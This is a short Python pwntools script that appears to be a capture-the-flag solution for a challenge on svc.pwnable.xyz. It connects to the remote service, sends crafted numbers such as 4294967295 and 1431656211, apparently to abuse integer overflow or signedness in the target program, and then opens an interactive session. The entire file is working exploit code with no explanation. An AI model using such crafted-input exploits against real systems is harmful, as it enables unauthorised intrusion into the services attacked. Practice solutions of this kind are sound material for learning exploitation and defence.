from pwn import *
from struct import *

debug = 0
if  debug:
    sh = process('./challenge')
else:
    sh = remote('svc.pwnable.xyz', 30008)
sh.sendlineafter(': ', '1336')
sh.sendlineafter(': ', '4294967295')
sh.sendlineafter('=\n', '3 1431656211')
sh.sendlineafter('=\n', '0 0 0 0 0')
sh.interactive()
